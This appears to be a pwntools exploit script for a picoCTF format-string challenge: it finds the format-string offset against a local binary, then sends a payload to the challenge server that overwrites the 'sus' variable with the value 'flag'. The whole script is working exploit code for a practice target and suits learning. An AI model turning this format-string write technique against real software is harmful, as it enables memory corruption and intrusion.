from pwn import *

elf = context.binary = ELF('./vuln')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info(f"{offset=}")

info(f"{elf.symbols['sus']=}")

p = remote('rhea.picoctf.net', 56322)
p.sendline(fmtstr_payload(offset, {elf.sym['sus']: 0x67616c66}))
info(p.recvall().decode())
p.close()